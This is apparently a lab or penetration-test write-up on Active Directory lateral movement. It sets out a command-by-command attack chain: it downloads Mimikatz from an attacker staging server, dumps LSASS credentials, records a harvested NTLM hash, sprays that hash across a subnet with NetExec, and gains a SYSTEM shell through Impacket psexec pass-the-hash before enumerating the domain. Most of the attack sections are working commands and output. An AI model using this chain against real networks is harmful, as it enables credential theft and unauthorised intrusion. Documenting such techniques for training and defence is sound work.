# Lateral Movement in the AD Network

**Phase:** Credential Dumping, Pass-the-Hash & Lateral Movement (Child Domain)

---

## 1. Local Privilege Awareness & Situational Reconnaissance

Once initial remote code execution is achieved on a Windows victim (e.g., via a staged reverse shell from Metasploit/PsExec), verify current privileges and execution context.

```cmd
whoami /priv
```

### Purpose & High-Value Privileges
* **`SeDebugPrivilege`**: Essential for interacting with process memory belonging to other security contexts. Specifically required to inject into or inspect `lsass.exe` (Local Security Authority Subsystem Service) using tools like Mimikatz.
* **`SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`**: Useful for potato-style privilege escalation (e.g., SweetPotato, GodPotato) if operating from a service account context.

---

## 2. In-Memory Credential Harvesting (Mimikatz)

Operating from an interactive PowerShell or Command Prompt shell on the compromised host (`192.168.98.30`):

### 2.1 File Transfer & Execution Setup
Download Mimikatz directly from the attacker's staging server:

```powershell
# In PowerShell session
Invoke-WebRequest -Uri "http://10.10.200.2:8000/mimikatz.exe" -OutFile "C:\Users\john\Downloads\mimi.exe"
or
iwr http://10.10.200.2:8000/mimikatz.exe -OutFile C:Users\john\downloads\mimi.exe
```

> **Note on Console Interaction:** Non-interactive or constrained PowerShell sessions may hang or drop interactive subshells. Drop into a clean `cmd.exe` or invoke commands via batch-mode/script syntax (`mimi.exe "privilege::debug" "sekurlsa::logonpasswords" exit`).

### 2.2 LSASS Dumping
```cmd
# Execute Mimikatz
mimi.exe

# Elevate privileges to debug other processes
privilege::debug

# Extract cleartext credentials, Kerberos tickets, and NTLM hashes from LSASS memory
sekurlsa::logonpasswords
```

### Harvested Artifacts
From the compromised host (`192.168.98.30`), the following credentials were recovered:
* **Account 1:** `john` (Local/Domain User)
* **Account 2:** `corpmngr` (Domain User / Administrative Candidate)
* **Recovered NTLM Hash (`corpmngr`):**  
  `aad3b435b51404eeaad3b435b51404ee:4cb3933610b827a281ec479031128cc6` (or `:4cb3933610b827a281ec479031128cc6`)

---

## 3. Lateral Movement Reconnaissance (SMB Spraying / Pass-the-Hash)

To discover where the newly acquired credentials grant administrative or local access, test network-accessible hosts across the internal target subnet (`192.168.98.0/24`) through our established SOCKS pivot.

### 3.1 Network Verification using NetExec / CrackMapExec via ProxyChains

```bash
# Spraying the NTLM hash across internal targets over SOCKS proxy
proxychains poetry run nxc smb 192.168.98.2 -u corpmngr -H :4cb3933610b827a281ec479031128cc6
# [-] STATUS_LOGON_FAILURE / Access Denied

proxychains poetry run nxc smb 192.168.98.30 -u corpmngr -H :4cb3933610b827a281ec479031128cc6
# [-] Target host (Source) - no new administrative vantage

proxychains poetry run nxc smb 192.168.98.120 -u corpmngr -H :4cb3933610b827a281ec479031128cc6
# [+] Status: SMB Login Successful (Pwned! / (Pwn3d!) Local Administrator confirmed)
```

* We dumped the credentials using mimikatz from the machine 192.168.98.30 for which we got our reverse shell earlier using msfconsole rev.exe and found two ntlm hashes then we tested the hashes with user corpmngr to different machines and found that it has full smb right access on 192.168.98.120 machine so now we will be able to perform the smb execution via psexec


* **Outcome:** `corpmngr` has full administrative access and write privileges on `192.168.98.120`.

---

## 4. Pass-the-Hash Remote Execution via PsExec

With confirmed local administrative permissions on `192.168.98.120`, leverage Impacket's `psexec.py` to obtain a high-privileged interactive shell.

### 4.1 Execution
```bash
# Attempting remote execution against unprivileged host (Expected: Failure)
proxychains psexec.py 'child/corpmngr@192.168.98.30' -hashes :4cb3933610b827a281ec479031128cc6

# Exploiting verified administrative target (192.168.98.120)
proxychains psexec.py 'child/corpmngr@192.168.98.120' -hashes :4cb3933610b827a281ec479031128cc6
```

### 4.2 How PsExec Works Under the Hood
1. **Authentication:** Authenticates to the target machine over SMB (TCP 445) using Pass-the-Hash (NTLM response calculation without knowing the plaintext password).
2. **Payload Upload:** Uploads a randomized service executable to the administrative share (e.g., `ADMIN$` -> `C:\Windows\`).
3. **Service Management:** Connects to the remote Service Control Manager (`svcctl` RPC interface) to register and start the newly created service.
4. **Interactive Channel:** The binary creates named pipes over SMB (e.g., `stdin`, `stdout`, `stderr`) redirected to `cmd.exe`, providing a remote interactive shell with `NT AUTHORITY\SYSTEM` privileges.
5. **Teardown:** Stops and removes the service upon session termination.

---

## 5. Domain Verification & Post-Exploitation

From the newly acquired shell on `192.168.98.120`:

```powershell
# Enumerate domain context and active user accounts
net user /dom
```

### Observation & Findings
* Target host `192.168.98.120` acts as / connects directly into the **Child Domain Controller (`child.domain.local`)**.
* Lateral movement successfully transitioned access from an initial low-privileged compromised host into the child domain controller's perimeter, paving the way for child-to-parent domain trust abuse and domain privilege escalation.